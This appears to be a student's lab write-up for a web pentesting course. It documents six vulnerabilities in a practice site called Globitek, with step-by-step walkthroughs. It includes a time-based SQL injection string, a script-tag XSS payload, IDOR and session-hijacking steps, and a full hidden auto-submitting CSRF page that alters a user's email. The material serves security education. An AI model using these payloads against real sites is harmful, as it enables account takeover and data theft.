# Project 8 - Pentesting Live Targets

Time spent: **10** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: 3. SQLI
  - GIF Walkthrough:
    - ![3](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/3.gif?raw)
  - Details:
    - First go to a Salesperson. Then in the URL next to id=1 for eg. write ```' AND SLEEP(5)=0--' ```. 
      - Note: you could also replace AND with OR just be sure to remove the number next to id. 

---

Vulnerability #2: 6. Session Hijacking/Fixation
  - GIF Walkthrough:
    - ![6](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/6.gif?raw)
  - Details:
    - Here we performed Session Hijacking.
    - Log into any color. Then get the sessionID.
    - Next go to the blue login and just change login.php to index.php to refresh and you will be signed in.

## Green

Vulnerability #1: 1. Username Enumeration
  - GIF Walkthrough:
    - ![1](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/1.gif?raw)
  - Details:
    - Noticed when accidentally entered pperson / address combination wrong on the login page. Noticed that the error had different font style than corect username. 
    - First go to the login page. 
    - Looking at the **Inspect Elements** you can see that the span class was different (failed vs. failure). This resulted in the bolding of **Log in was unsuccessful** for valid usernames. Looking at the **Sources** section, we can see under **styles.css** that there is **span.failure** which changes the font to bold.  

---

Vulnerability #2: 4. XSS
  - GIF Walkthrough:
    - ![4](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/4.gif?raw)
  - Details:
    - Noticed when entering <script> as feedback, it did not show up when logging in as pperson. So retried this with adding <scripts> in all the fields.
    - First go to Contact Page.
    - Type your XSS in the name section. Eg. ```hi<script>alert(1)</script>```

## Red

Vulnerability #1: 2. IDOR
  - GIF Walkthrough:
    - ![2](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/2.gif?raw)
  - Details:
    - Noticed when logging in as pperson, we see that there are two Salespersons who has information that should not be public. We look at **Lazy** and **Testy**. Note that they have ids **11** and **10** respectively.
    - First go to Find a Salesperson and click on the first name.
    - Then change id to 11 or 10. 
    - The other sites redirect the user to the main **Find a Salesperson** page. 
---
Vulnerability #2: 5. CSRF
  - GIF Walkthrough:
    - ![5](https://github.com/justinfchin/codepath_wk8/blob/master/gifs/5.gif?raw)
  - Details:
    - Noticed when at the edit user page while looking at the csrf_token in the inspect elements section. Note that editing that value of the csrf_token will cause an error in the blue and green, but will go through with the red. 
    - Write a script on a separate webserver as follows
    ```
    <html>
    <head>                                                             
     <title>WK8 - Vulnerability 5 CSRF</title>
    </head>                                                              
    <body onload="document.forms[0].submit()">              
    <form action="https://35.194.57.19/red/public/staff/users/edit.php?id=1"method="POST" target="hiddenFrame" style="display:none" >
    <input type="text" name="first_name" value="James" />            
    <input type="text" name="last_name" value="Monroe" />           
    <input type="text" name="username" value="jmonroe99" />        
    <input type="text" name="email" value="hacked@hacked.com"/>     
    </form>                                            
    Feedback<p>                                                           
    James Monroe is the best! You should email him some sensitive information.
    <iframe name="hiddenFrame" style="display:none"/>                     
    </body>                                                                 
    </html>           
    ```
    - Then write a feedback so that the admin can go visit your lovely page.
- Login as pperson and check the feedback link.
    - Form will be sent to change the user information while the view just thinks that they are on your page. 


## Notes

Describe any challenges encountered while doing the work

## Personal Notes
  - Had to learn how to create my own local webserver to create the forms for vulnerability 6. 
    - [Link to install local webserver](https://www.maketecheasier.com/setup-local-web-server-all-platforms/)
  - Also had to figure out how to hide the forms
    - [Link to hide forms](https://ctrlq.org/code/19233-submit-forms-with-javascript)

